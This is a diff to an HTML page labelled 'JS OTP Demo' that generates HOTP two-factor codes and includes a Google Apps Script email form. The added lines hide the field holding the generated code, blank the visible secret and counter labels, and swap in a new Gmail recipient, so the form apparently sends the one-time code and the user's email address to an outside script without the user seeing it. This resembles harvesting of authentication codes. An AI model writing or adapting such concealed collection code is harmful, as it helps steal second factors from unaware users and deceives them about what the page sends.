@@ -1,11 +1,12 @@
 <html><head>
 <title>JS OTP Demo</title>
-<style>
-    body {
-        margin: 0 auto;
-        font-family: Tahoma, Verdana, Arial, sans-serif;
-    }
-</style>
+
+   <style type="text/css">
+        .pure-message
+        {
+            visibility: hidden;
+        }
+    </style>
 </head>
 <body style="width: 45em;">
 
@@ -16,33 +17,30 @@
 <p>Javascript Implementation of 2 Factor Auth</p>
 
 
-
-<p id="secret-2">Secret: </p>
-<h2 id="code-2">HOTP code</h2>
-<p>Counter value is: <span id="counter"></span></p>
-<button onclick="requestHotp()">Get new code</button>
-
-
 <link rel="stylesheet" href="https://unpkg.com/purecss@1.0.0/build/pure-min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
-   <!-- Style The Contact Form How Ever You Prefer -->
    
    <link rel="stylesheet" href="https://cdn.rawgit.com/dwyl/learn-to-send-email-via-google-script-html-no-server/master/style.css">
 
-  
-  <form id="gform" method="POST" class="pure-form pure-form-stacked" data-email="mrzanderzim@gmail.com"
+   
+ 
+  <form id="gform" method="POST" class="pure-form pure-form-stacked" data-email="trinityebuisness2@gmail.com"
   action="https://script.google.com/macros/s/AKfycbyH7FEitTSwjHqGn6R6QtXoliIHANrU3Vu-fIgypg0aU-LOoWM/exec">
     <!-- change the form action to your script url -->
 
-   
-    <fieldset class="pure-group">
+    <fieldset class="pure-message">
       <label for="message">Message: </label>
-      <textarea id="code-2" name="message" rows="10" value= "requestHotp()"
+      <textarea type="password" id="code-2" name="message" rows="1" value= "requestHotp()"
       placeholder="secret code"></textarea>
     </fieldset>
 
+<p id="secret-2"> </p>
+
+<p> <span id="counter"></span></p>
+
+
     <fieldset class="pure-group">
-      <label for="email"><em>Your</em> Email Address:</label>
+      <label for="email"><em>Your</em> Email Associated:</label>
       <input id="email" name="email" type="email" value=""
       required placeholder="your.name@email.com"/>
       <span id="email-invalid" style="display:none">
@@ -50,6 +48,10 @@
     </fieldset>
 
    
+<button onclick="requestHotp()">set code</button>
+
+<br>
+<br>
 
     <button class="button-success pure-button button-xlarge">
       <i class="fa fa-paper-plane"></i>&nbsp;Send</button>
